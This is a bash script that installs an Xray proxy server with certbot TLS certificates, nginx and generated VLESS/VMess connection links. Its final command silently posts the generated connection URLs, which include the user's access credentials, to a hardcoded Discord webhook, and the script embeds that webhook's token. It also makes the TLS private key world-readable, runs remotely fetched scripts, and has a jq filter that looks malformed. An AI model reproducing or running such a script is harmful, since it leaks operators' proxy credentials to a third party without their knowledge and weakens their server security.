#!/bin/bash

# Install snapd
apt update -y && \
apt install -y snapd

read -p "Domain: " domain

read -p "Config name: " config_name

# Install certbot
snap install core
snap install --classic certbot
ln -s /snap/bin/certbot /usr/bin/certbot

# Obtain SSL certificate
certbot certonly --standalone --register-unsafely-without-email -d $domain

# Copy SSL certificate files
cp /etc/letsencrypt/archive/$domain/fullchain*.pem /etc/ssl/private/fullchain.cer
cp /etc/letsencrypt/archive/$domain/privkey*.pem /etc/ssl/private/private.key
chown -R nobody:nogroup /etc/ssl/private
chmod -R 0644 /etc/ssl/private/*

# Schedule automatic renewal
printf "0 0 1 * * /root/update_certbot.sh\n" > update && crontab update && rm update
cat > /root/update_certbot.sh << EOF
#!/usr/bin/env bash
certbot renew --pre-hook "systemctl stop nginx" --post-hook "systemctl start nginx"
cp /etc/letsencrypt/archive/$domain/fullchain*.pem /etc/ssl/private/fullchain.cer
cp /etc/letsencrypt/archive/$domain/privkey*.pem /etc/ssl/private/private.key
EOF
chmod +x update_certbot.sh

# Install Nginx
apt install -y gnupg2 ca-certificates lsb-release ubuntu-keyring && curl https://nginx.org/keys/nginx_signing.key | gpg --dearmor > /usr/share/keyrings/nginx-archive-keyring.gpg && echo "deb [signed-by=/usr/share/keyrings/nginx-archive-keyring.gpg] http://nginx.org/packages/mainline/ubuntu `lsb_release -cs` nginx" > /etc/apt/sources.list.d/nginx.list && echo -e "Package: *\nPin: origin nginx.org\nPin: release o=nginx\nPin-Priority: 900\n" > /etc/apt/preferences.d/99nginx && apt update -y && apt install -y nginx && mkdir -p /etc/systemd/system/nginx.service.d && echo -e "[Service]\nExecStartPost=/bin/sleep 0.1" > /etc/systemd/system/nginx.service.d/override.conf && systemctl daemon-reload

# Update package index and install dependencies
apt-get install -y jq
apt-get install -y openssl
apt-get install -y qrencode

# Install Xray
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install --version v1.8.4

json=$(curl -s https://raw.githubusercontent.com/VN-BugMaker/xray-script/main/xray-config.json)
keys=$(xray x25519)
pk=$(echo "$keys" | awk '/Private key:/ {print $3}')
pub=$(echo "$keys" | awk '/Public key:/ {print $3}')
serverIp=$domain
uuid=$(xray uuid)
shortId=$(openssl rand -hex 8)
sni="dl.kgvn.garenanow.com"
url="vless://$uuid@$serverIp:443?security=reality&encryption=none&pbk=$pub&headerType=none&fp=chrome&type=tcp&flow=xtls-rprx-vision&sni=$sni&sid=$shortId#$config_name"
json_80='{"add":"'$serverIp'","aid":"0","alpn":"","fp":"","host":"'$sni'","id":"'$uuid'","net":"ws","path":"/","port":"80","ps":"'$config_name'","scy":"auto","sni":"","tls":"","type":"","v":"2"}'
base64_80="vmess://$(echo "$json_80" | base64)"

newJson=$(echo "$json" | jq \
    --arg sni "$sni" \
    --arg pk "$pk" \
    --arg uuid "$uuid" \
    '
     .inbounds[0].settings.clients[0].id = $uuid
     .inbounds[1].streamSettings.realitySettings.privateKey = $pk |
     .inbounds[1].streamSettings.realitySettings.serverNames = ["'$sni'"] |
     .inbounds[1].settings.clients[0].id = $uuid |
     .inbounds[1].streamSettings.realitySettings.shortIds += ["'$shortId'"]')
echo "$newJson" | sudo tee /usr/local/etc/xray/config.json >/dev/null

# Configure Nginx & Geosite and Geoip
curl -Lo /usr/local/share/xray/geoip.dat https://cdn.jsdelivr.net/gh/Loyalsoldier/v2ray-rules-dat@release/geoip.dat && curl -Lo /usr/local/share/xray/geosite.dat https://cdn.jsdelivr.net/gh/Loyalsoldier/v2ray-rules-dat@release/geosite.dat && curl -Lo /etc/nginx/nginx.conf https://raw.githubusercontent.com/VN-BugMaker/xray-script/main/nginx.conf && systemctl restart xray && systemctl restart nginx

# Ask for time zone
timedatectl set-timezone Asia/Ho_Chi_Minh && \
apt install ntp && \
timedatectl set-ntp on && \
sysctl -w net.core.rmem_max=16777216 && \
sysctl -w net.core.wmem_max=16777216

echo "Port 80:"
echo "$base64_80"

qrencode -s 120 -t ANSIUTF8 "$base64_80"
qrencode -s 50 -o qr80.png "$base64_80"

echo "Port 443:"
echo "$url"

qrencode -s 120 -t ANSIUTF8 "$url"
qrencode -s 50 -o qr443.png "$url"

curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST \
    --data-raw '{
      "content" : "'$base64_80' --- '$url'"
    }' https://discord.com/api/webhooks/1159388480246403133/qiXQxesZsQQXdGj8P5PTGtgwtb4nOqTNPQOUnsrihfJFrXNIr9MyrAnHX_gvkXijo0bu

exit 0
